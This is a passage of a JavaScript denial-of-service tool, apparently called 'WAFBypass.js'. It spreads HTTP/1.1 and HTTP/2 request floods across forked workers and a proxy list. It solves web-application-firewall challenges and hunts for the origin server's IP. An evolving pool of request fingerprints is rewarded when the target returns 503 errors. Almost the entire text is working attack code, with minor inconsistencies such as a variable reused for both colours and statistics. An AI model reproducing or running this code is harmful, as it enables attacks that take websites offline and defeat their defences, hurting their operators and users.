        huntOrigin(urlObj, waf, o => console.log(`[test] origin: ${o ? o.ip+':'+o.port : '<not found>'}`));
      }
    }
    process.exit(0);
  });
  return;
}

/* ── normal flood mode ── */
if (cluster.isMaster) {
  const R = '\x1b[31m', D = '\x1b[90m', W = '\x1b[37m', X = '\x1b[0m';
  console.log(`\n${R}WAFBypass.js${X} ${D}— pluggable WAF evasion${X}\n`);
  console.log(`${W}target:${X} ${target}  ${W}duration:${X} ${duration}s  ${W}threads:${X} ${threads}\n`);

  let A2 = { req:0, ok:0, s5xx:0, byp:0 }, prev = 0;
  function spawnW() {
    const w = cluster.fork({ ADAPTIVE: JSON.stringify(A) });
    w.on('message', msg => {
      if (msg.type !== 'stats') return;
      A2.req += msg.req; A2.ok += msg.ok; A2.s5xx += msg.s5xx; A2.byp += msg.byp;
      W.ok += msg.wok; W.s503 += msg.ws503; W.s429 += msg.ws429; W.s403 += msg.ws403;
      W.err += msg.werr; W.to += msg.wto; W.ga += msg.wga; W.rst += msg.wrst; W.n += msg.wn;
    });
    return w;
  }
  let workers = Array.from({ length: threads }, spawnW);

  const tuneLoop = setInterval(() => {
    tune();
    workers.forEach(w => { try { w.send({ type: 'adapt', state: A }); } catch {} });
  }, 1800);

  const dispLoop = setInterval(() => {
    if (O.silent) return;
    const rps = A2.req - prev; prev = A2.req;
    process.stdout.write(`\r\x1b[2Kreq=${A2.req} ok=${A2.ok} 5xx=${A2.s5xx} byp=${A2.byp} rps=${rps} mode=${A.mode}`);
  }, 1000);

  setTimeout(() => {
    clearInterval(tuneLoop); clearInterval(dispLoop);
    workers.forEach(w => { try { w.kill(); } catch {} });
    console.log(`\n${R}done.${X}`);
    process.exit(0);
  }, duration * 1000);

} else {
  /* worker */
  try { Object.assign(A, JSON.parse(process.env.ADAPTIVE || '{}')); } catch {}
  process.on('message', m => { if (m?.type === 'adapt') Object.assign(A, m.state); });

  let proxies = [];
  try { proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(l => l.includes(':')); }
  catch { process.exit(1); }

  const pool = new GenePool(40);
  setInterval(() => pool.evolve(), 3000);

  let S = { req:0, ok:0, s5xx:0, byp:0 };
  let WAF_CACHE = { key: null, protocol: 'h2', cookie: null, origin: null };

  /* one-shot detection + challenge on first viable request */
  function bootstrap(cb) {
    const proxy = rnd(proxies);
    const g = pool.pick();
    preflight(urlObj, proxy, g, async r => {
      const waf = detectWAF(r);
      WAF_CACHE.key = waf;
      WAF_CACHE.protocol = O.version === '1' ? 'h1' : O.version === '2' ? 'h2' : WAF[waf].protocol;
      if (O.bypass && waf !== 'generic') {
        try { WAF_CACHE.cookie = await WAF[waf].solveChallenge(r.body); } catch {}
      }
      if (O.origin) huntOrigin(urlObj, waf, o => { WAF_CACHE.origin = o; cb(); });
      else cb();
    });
  }

  function rec(code, genomeId) {
    W.n++;
    if (code >= 200 && code < 300) { S.ok++; W.ok++; pool.reward(genomeId, +2); }
    else if (code === 503)         { S.s5xx++; W.s503++; pool.reward(genomeId, +3); }
    else if (code === 429)         { W.s429++; pool.reward(genomeId, -1); }
    else if (code === 403)         { W.s403++; pool.reward(genomeId, -3); }
    else if (code >= 500)          { S.s5xx++; W.err++; pool.reward(genomeId, -0.5); }
  }

  function go() {
    if (!proxies.length) return;
    const proxy = rnd(proxies);
    const g = pool.pick();
    const { ph, pp } = splitProxy(proxy);
    if (!ph) return setTimeout(go, 100);

    const connectHost = (O.origin && WAF_CACHE.origin) ? WAF_CACHE.origin.ip : ph;
    const connectPort = (O.origin && WAF_CACHE.origin) ? WAF_CACHE.origin.port : pp;

    const sock = net.connect(pp, ph, () => {
      sock.once('data', () => {
        const useH1 = WAF_CACHE.protocol === 'h1';
        const ts = tls.connect(makeTLSOpts(g, {
          socket: sock, servername: urlObj.hostname,
          ALPNProtocols: useH1 ? ['http/1.1'] : ['h2', 'http/1.1'],
          timeout: A.timeout,
        }), () => _fire(ts, useH1, g));
        ts.on('error', () => { W.err++; W.n++; pool.reward(g.id, -0.5); sock.destroy(); setTimeout(go, 80); });
        ts.setTimeout(A.keepalive, () => { W.to++; W.n++; ts.destroy(); setTimeout(go, 80); });
      });
      sock.write(`CONNECT ${urlObj.hostname}:443 HTTP/1.1\r\nHost: ${urlObj.hostname}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });
    sock.on('error', () => { W.err++; W.n++; pool.reward(g.id, -0.5); setTimeout(go, 80); });
    sock.setTimeout(A.keepalive, () => { W.to++; W.n++; sock.destroy(); setTimeout(go, 80); });
  }

  function _fire(ts, useH1, g) {
    const cookie = [WAF_CACHE.cookie, O.cookies && WAF[WAF_CACHE.key] ? WAF[WAF_CACHE.key].cookieSchema() : '']
      .filter(Boolean).join('; ');

    if (useH1) {
      function w() {
        if (ts.destroyed) return;
        const bufs = [];
        for (let i = 0; i < A.burst; i++) bufs.push(buildH1(g, urlObj, cookie));
        ts.write(Buffer.concat(bufs), e => {
          if (!e) { S.req += A.burst; setTimeout(w, A.delay); }
          else { W.err++; W.n++; pool.reward(g.id, -0.5); ts.destroy(); }
        });
      }
      ts.on('data', chunk => {
        const s = chunk.toString('binary', 0, 16), i = s.indexOf(' ');
        if (i > 0) rec(parseInt(s.slice(i + 1, i + 4)), g.id);
      });
      w();
    } else {
      const hpack = new HPACK();
      hpack.setTableSize(4096);
      let sid = 1, ibuf = Buffer.alloc(0);
      ts.on('data', data => {
        ibuf = Buffer.concat([ibuf, data]);
        while (ibuf.length >= 9) {
          const f = decodeFrame(ibuf); if (!f) break;
          ibuf = ibuf.subarray(f.len + 9);
          if (f.type === 4 && f.flags === 0) ts.write(frame(0, 4, Buffer.alloc(0), 1));
          if (f.type === 7) { W.ga++; W.n++; pool.reward(g.id, -1); ts.destroy(); }
          if (f.type === 5) { W.rst++; W.n++; pool.reward(g.id, -1); ts.destroy(); }
          if (f.type === 1 && f.payload.length) {
            try {
              const dec = hpack.decode(f.payload);
              const st = dec.find(h => h[0] === ':status');
              if (st) rec(parseInt(st[1]), g.id);
            } catch {}
          }
        }
      });
      ts.write(H2_INIT);
      function w() {
        if (ts.destroyed) return;
        const batch = [];
        for (let b = 0; b < A.burst; b++) {
          const hdrs = buildH2(g, urlObj, cookie);
          const packed = Buffer.concat([Buffer.from([0x80, 0, 0, 0, 0xFF]), hpack.encode(hdrs)]);
          batch.push(frame(sid, 1, packed, 0x25));
          sid += 2;
        }
        ts.write(Buffer.concat(batch), e => {
          if (!e) { S.req += A.burst; setTimeout(w, A.delay); }
          else { W.err++; W.n++; pool.reward(g.id, -0.5); ts.destroy(); }
        });
      }
      w();
    }

    ts.on('error', () => { W.err++; W.n++; pool.reward(g.id, -0.5); ts.destroy(); });
    ts.on('close', () => setTimeout(go, 80));
  }

  /* boot then flood */
  bootstrap(() => {
    setInterval(go, 1000 / rate);
  });

  setInterval(() => {
    try { process.send({ type: 'stats', req: S.req, ok: S.ok, s5xx: S.s5xx, byp: S.byp, wok: W.ok, ws503: W.s503, ws429: W.s429, ws403: W.s403, werr: W.err, wto: W.to, wga: W.ga, wrst: W.rst, wn: W.n }); } catch {}
    S = { req:0, ok:0, s5xx:0, byp:0 };
    W = { ok:0, s503:0, s429:0, s403:0, err:0, to:0, ga:0, rst:0, n:0 };
  }, 700);
}